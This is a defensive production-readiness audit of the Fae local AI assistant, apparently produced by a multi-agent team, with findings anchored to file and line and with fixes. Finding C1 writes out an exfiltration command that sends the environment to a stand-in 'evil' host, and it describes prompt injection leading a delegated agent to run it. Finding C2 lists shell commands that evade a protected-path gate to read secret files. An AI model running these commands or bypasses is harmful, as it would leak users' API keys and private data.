# Fae Production-Readiness Audit — Findings Report (2026-07-05)

Adversarial 8-dimension audit of `main @ a8db7e13`, run by a multi-agent team
(security ×3 deep sub-audits, correctness ×2, plus reliability, Linux, perf,
tests, docs, supply-chain). Every critical/high below is anchored to file:line;
the three contested findings were independently re-verified by the lead against
the real code (verdicts noted inline). Severities reflect that verification, not
the raw agent reports.

**Bottom line:** the architecture holds where it matters most — the conductor
four-gate cloud-egress boundary is intact and local is the default (structurally
unreachable cloud lane from a live turn), envelope-gate ingress is single-path
and fail-closed, models.lock is fail-closed, all 8 live-pass fixes are still
intact, and the unwrap/panic ban is clean. But the audit found **two CRITICAL
security release-blockers** (a daemon child-spawn secret leak and a bypassable
bash protected-path gate) and a set of HIGHs across correctness, perf, and
reliability that should land before a cloud-lane release.

---

## CRITICAL (release-blockers — fix before shipping the cloud lane)

### C1 — Daemon child spawns inherit the full daemon environment (cloud/ACP keys leak)
The daemon holds `FAE_OPENROUTER_API_KEY` (main.rs:688) and optional ACP provider
keys (`FAE_CODEX/OPENAI/CLAUDE/ANTHROPIC/GEMINI/…`, main.rs:708-720) in its process
env. No daemon child-spawn site calls `env_clear()`:
- **Linux jailed/delegated bash:** `exec_jailed_linux` reimplements exec as
  `Command::new("sh")` with inherited env (toolhost/isolation.rs:361-366); Landlock
  confines writes only, network is open. (macOS bash is safe — it routes through
  fluers' env-scrubbed exec at isolation.rs:243.)
- **MCP subprocess (both platforms):** vendored `mistralrs-mcp` `ProcessTransport::new`
  (vendor/mistral.rs/mistralrs-mcp/src/transport.rs:538-556) uses tokio `Command::new`
  and only *adds* env; Fae passes `env=None` (crates/fae-daemon/src/mcp/mod.rs:205);
  MCP servers are explicitly un-jailed.

**Exploit:** a delegated/jailed bash turn or a declared MCP server runs
`curl -d "$(printenv)" https://evil` — no writes, network allowed, env inherited,
not a catastrophe-pattern. A prompt-injection (web/email/MCP-result/peer) can induce
it on the delegate lane.

**Fix (single, covers both):** keep provider keys out of the daemon's ambient env —
hand them to the OpenRouter adapter over a non-env channel — **or** `env_clear()` +
explicit allowlist (PATH/HOME/LANG/FAE_LLAMA*) at every child spawn (the Linux jail
exec *and* wrap the MCP transport to pass a scrubbed env map instead of `None`).

### C2 — DamageControl bash protected-path gate is a substring match — trivially evaded
The bash zero-access check (DamageControlPolicy.swift:263-266 → `commandReferencesPath`
→ `protectedNeedles`, :417-424) is `normalized.contains(needle)` for literal spellings
only, and `SafeBashExecutor` does not restrict reads. So a prompt-injected local model
(the threat model the code itself adopts, DamageControlPolicy.swift:206-207) reads the
always-zero-access secret/identity files via `cd ~ && cat .secrets`, `cat ~/.sec*`,
`f=.secrets; cat ~/$f`, or `tar czf /tmp/x.tgz ~` — none contain the literal needle.
Same technique reads `directive.md`, `speakers.json`, `~/.fae-vault`.

**Fix:** the sound fix is to run bash under an OS sandbox (macOS `sandbox-exec` /
seatbelt profile) denying the protected paths — string matching cannot be made sound.
Needs owner testing.

---

## HIGH

### Security
- **S-H1 — raw `[heard]` transcript persisted un-redacted to the durable, FTS-indexed
  SessionStore**, re-entering LLM context via `session_search`. `PipelineCoordinator.swift`
  `persistAcceptedUserTurnIfNeeded` (:2022-2039) / `persistFinalAssistantTurnIfNeeded`
  (:2042-2057) call `sessionStore.appendMessage(content: trimmed)` with raw text; memory
  capture redacts `fae.db` but this parallel store keeps secrets in the clear.
  **Fix:** redact (`SensitiveContentPolicy.redactForStorage` + `SensitiveDataRedactor`)
  before `appendMessage` in both methods.
- **S-H2 — `fae-pii-membrane` misses/weakens real credential shapes.** AWS `AKIA…` (20
  chars) evades entirely (lib.rs:159-163, below the 40-char catch-all); `private_key_block`
  is case-sensitive (lib.rs:107, unlike every other rule); and the rule table **fails open**
  on a regex compile error (`filter_map(...ok())`, lib.rs:175-182). **Fix:** add an
  `AKIA[0-9A-Z]{16}` rule, add `(?i)` to the PEM rule, and abort at init if compiled-rule
  count ≠ raw-rule count.
- **S-H3 — mesh auto-reply egress bypasses the PII membrane.** `peer/mod.rs:444-493`
  `auto_reply()` sends the LLM reply to an external x0x peer (`send_direct_message`, :487)
  with no `should_block_remote_egress` scan (zero membrane use under `peer/`). Bounded (guest
  turn is tool-less/memory-less) but any secret the model reproduces leaves un-scanned.
  **Fix:** scan reply + all outbound `send_direct_message` text before send.

### Correctness
- **CR-H1 — `agent.prompt` spawned task is not tracked in `tool_tasks`**, so connection
  teardown blocks at `writer.await` for the full agent run (fae-acp transport.rs:281-311 vs
  teardown :897-916). A Swift disconnect mid-agent-turn stalls `handle_connection` holding
  the socket fd + engine Arc for minutes. **Fix:** add `agent.prompt` to `tool_tasks` + pass
  `session_cancel.clone()`.
- **CR-H2 — fan-out child delegations orphaned on parent cancel.** `delegate.rs:887` spawns
  children via bare `tokio::spawn`; aborting the parent *detaches* (not aborts) them, and the
  `delegate.rs:459` iteration loop never checks `deps.cancel.is_cancelled()` — a child in
  `run_turn` runs to completion (worst case ≈32 min orphaned engine use per disconnected
  orchestrator turn). **Fix:** cancel-check at loop top + `JoinSet` with propagated cancel.
- **CR-H3 — `DaemonEventSubscriber.stop()` latent deadlock.** `stop()` traps `close(fd)`
  inside a `queue.sync` that the blocking `recv()` (no `SO_RCVTIMEO`) occupies
  (DaemonEventSubscriber.swift:85-91, :76, :281); `restartDaemonEventSubscriber` calls it
  (PipelineCoordinator.swift:5952). *Verified:* not "every restart hangs" as first reported —
  crash-recovery/graceful-stop close the socket first, unblocking `recv` — but a half-open
  socket or config-respawn ordering can hang the actor. **Fix (cheap, strictly safer):**
  `SO_RCVTIMEO` in `connectLocked`, or move `stopped`+`close(fd)` under a separate lock.

### Performance
- **P-H1 — `improvement_cycle` bypasses `AwarenessThrottle`** (FaeScheduler.swift:1880;
  Tier-1 list AwarenessThrottle.swift:32 omits it), so MetaOptimizer hill-climbing (10
  benchmark runs, 30-min cap) runs on battery at 03:00 and thermal-throttles into morning.
  **Fix:** one-line `AwarenessThrottle.check(taskId:"improvement_cycle")` at the top of
  `runImprovementCycle`, matching `runTrainingCycle` (:1640).
- **P-H2 — `recommendedMaxHistory` system budget is stale-large** (`systemBudget = 18_000`,
  FaeConfig.swift:707) so every 16 GB machine (the most common Apple tier) clamps to **6**
  history messages; the same 18K also inflates `initialReservedTokens` (FaeCore.swift:471)
  above the whole 16 K window. *Verified real; CLAUDE.md's `5000` formula is stale.* The
  code's own comment says the base prompt is ≈6K post-trim. **Fix:** `systemBudget` → ~8000
  at both sites.

### Reliability
- **R-H1 — `respawnDaemonWhenIdle` timeout is silent and irrecoverable** (FaeCore.swift
  ~2042-2080): after ~60 s the config change is dropped, the "setting up…" indicator never
  clears, no retry. Cloud-brain-setup (W3) and x0x-peer-change (W6) silently fail if the user
  is mid-conversation. **Fix:** post a failed `runtimeProgress` + retry; make the wait
  user-visible.

### Tests/CI
- **T-H1 — `fae-symphony-runner` + `fae-acp` are absent from the CI nextest command**
  (ci-linux.yml), so `runner_headless.rs` and all ACP tests never run in CI. **Fix:** add
  `-p fae-symphony-runner -p fae-acp`.
- **T-H2 — 3 `SkillBypassRegression` security tests always skip in CI** (inverted
  `guard CI == nil` at SkillBypassRegressionTests.swift:248/288/336). **Fix:** remove the CI
  guard + mock `SkillManager`, or add a Linux SkillHost equivalent.
- **T-H3 — local `crates/just check` is weaker than CI** (missing `-D clippy::panic/
  unwrap_used/expect_used`), so prod unwrap/expect passes locally and only fails at CI push.
  **Fix:** match CI lints in `crates/justfile`; switch its test to nextest with CI package scope.

### Supply chain
- **SC-H1 — GitHub Actions are unpinned (mutable tags) across all 7 workflows**, including
  the release artifact uploaders. **Fix:** pin every `uses:` to `@<sha>`; prioritize
  `action-gh-release` + `upload-artifact`.
- **SC-H2 — no `cargo-deny` license/advisory gate in CI** (809 packages, currently all
  MIT/Apache — clean, but drift is invisible). **Fix:** add `cargo deny check` + a minimal
  `deny.toml`.

### Docs (CLAUDE.md is ground truth for future agents)
- **D-H1 — skill count is 30 in CLAUDE.md, 33 on disk** (missing cloud-brain-setup,
  collaborate, connect-account). **D-H2 — internal contradiction:** CLAUDE.md still calls
  voice identity "the security model" in the Tool Security table + config comment while S18
  retired it (PTT is the gate). **Fix:** update both.

---

## MEDIUM (tracked; fix opportunistically)
Security: secure-input withholding gate weaker than storage gate (misses PEM/seed —
BuiltinTools.swift:874; add `SensitiveContentPolicy.scan`); URL exemption leaks basic-auth/
`?token=` (SensitiveDataRedactor.swift:82); envelope "signature-checked" is shape-only, no
real ML-DSA verify (peer/verifier.rs:90); `trust_decision`/`accept_with_flag` captured but
never gated (peer/mod.rs:412); jail is write-only (reads+network open on both platforms);
models.lock file itself not authenticity-verified (local swap); `FAE_MODELS_LOCK_PATH` not
dev-gated. Correctness: deny-path audit failures silently swallowed (toolhost/mod.rs:401,
skillhost/mod.rs:217); unbounded per-connection event queue under a slow reader (events.rs:34);
TTS char-vs-byte truncation seam (DaemonTTSEngine.swift:186 chars vs session.rs:2020 bytes).
Perf: daemon KV cache fp16 with no quantization below 32 GB (8 GB oversubscribes); session
store has no GC (unbounded fae.db growth); compaction hard-truncates silently when the daemon
is unavailable. Reliability: in-process fallback TTS cold-loads with no guard (PipelineCoordinator.swift:5602).
Linux: context menu is a silent no-op (fae-ui-shell/src/main.rs:2621); the "fae"/Lauren voice
is macOS-only (`local_voices_directory` cfg(macos), no `FAE_PIPER_VOICE` selector). Docs:
release-validation checklist has no phase for x0x / delegate-symphony / MCP / compaction /
UX W1-W6; CHANGELOG has zero released version entries. Supply: Kokoro weights + extra llama.cpp
binaries not in models.lock; vendor drift (candle#2214) untracked.

## LOW (tracked)
PII membrane is credential-only despite the "PII" name (email/phone/CC egress unblocked);
SensitiveInline OTP/codes never block egress by design; SafeBashExecutor catastrophe list is
substring-evadable (backstopped by DamageControl); short secrets slip the withholding
heuristic; `speakReplies=false` mute persists invisibly across restarts; `FAE_LLAMA_CTX`
external-override desync; `PeerIngress` cancel token discarded (graceful shutdown broken);
`budget.iterations_used` off-by-one on mid-loop failure; KV-prefix invalidation on
set_directive/activate_skill has no latency signal; Landlock BestEffort vs HardRequirement
inconsistency; CC-BY Rust logo attribution if the mistralrs server UI ships.

## REFUTED (raised by an agent, verified false)
- **Reliability F3 (PTT wedge):** the cited symbol `cancelAllInputs` does not exist; the real
  `cancelPending()` **is** called first thing in `pttStart()` (PipelineCoordinator.swift:219),
  explicitly for the wedge case. The PTT new-turn path is correct. Dropped.

---

## Positive attestations (things that are genuinely solid)
Conductor four-gate cloud egress is single-implementation and intact (mode cap → PII → pricing
→ budget → approval; executor.rs:812-888); the cloud lane is structurally unreachable from a
live turn (double fail-closed: only one triple-gated provider, and StaticDirectPolicy hardcodes
LocalOnly + empty workers). Envelope-gate ingress is single-path, gated-before-dispatch, 64 KiB
capped before serde alloc, `deny_unknown_fields`, unknown-kind fail-closed. models.lock is
size+SHA fail-closed; `FAE_MODELS_LOCK=off` and `FAE_ENGINE=mock` are FAE_DEV-gated. OpenRouter
key is Keychain-only, redacted Debug, env-not-socket, HTTPS-Authorization-only. `jail_backend_
available()` is fail-closed at every delegate call site. Delegate budgets are hard-clamped.
All 8 live-pass fixes are intact on main. The orb "Thinking" strand is now mitigated. The
unwrap/expect/panic-in-prod ban is clean in both Rust (CI-enforced) and Swift. No F5-TTS/
XTTS-v2/Fish weights ship; all shipping model licenses are AGPL/commercial-compatible.

## Owner-in-the-loop (cannot be greened headlessly — prepared, not claimed)
Fresh `run-dev` voice = Lauren (#21); live two-machine handoff tail (#17); ADR-014/015 sign-offs;
one live-key OpenRouter turn (note: the W3 "ask the cloud" route currently can't reach
RemoteAllowed — a wiring gap that fails safe); ASR fidelity; the reliability runbook item 12
(a-h) drafted by the audit; a real ACP (codex) approval card. A `scripts/ci/test-server-smoke.sh`
(PTT-listening round-trip, auto-cancel, context-trim, startup /health) would convert 4 of the
owner-only reliability checks into headless CI.
